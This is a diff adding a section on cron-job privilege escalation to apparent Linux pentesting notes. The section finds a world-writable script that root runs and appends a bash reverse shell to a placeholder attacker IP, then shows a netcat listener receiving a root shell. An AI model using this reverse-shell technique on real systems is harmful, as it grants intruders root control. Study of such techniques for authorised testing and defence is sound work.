@@ -344,6 +344,53 @@ Some things to take into consideration are:
 * Do you have write permissions to these files?
   * If you do then try modifying the PATH environment variable or something alike.
 
+#### Crontab Privilege Escalation
+
+View the contents of the system-wide crontab:
+
+```text
+$ cat /etc/crontab
+...
+* * * * * root script.sh
+* * * * * root /usr/local/bin/script.sh
+```
+
+Find the script on the server:
+
+```text
+$ locate script.sh
+/usr/local/bin/script.sh
+```
+
+Enumerate the file’s permissions:
+
+```text
+$ ls -l /usr/local/bin/script.sh
+-rwxr--rw- 1 root john 40 May 15 2021 /usr/local/bin/script.sh
+```
+
+> Note that the file is world writable.
+
+Add a reverse shell code in the script with the following:
+
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/YOUR_IP/443 0>&1
+```
+
+Set up a listener in you host \(e.g Kali or Parrot\) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:
+
+```text
+# nc –nvlp 443
+Listening on [any] 443 ...
+Connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47555
+bash: no job control in this shell
+root@victim:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ### Crontab PATH Environment Variable
 
 If a cron job program/script does **not use an absolute path**, and one of the PATH directories is **writable** by our user, we may be able to create a script with the same name as the cron job.
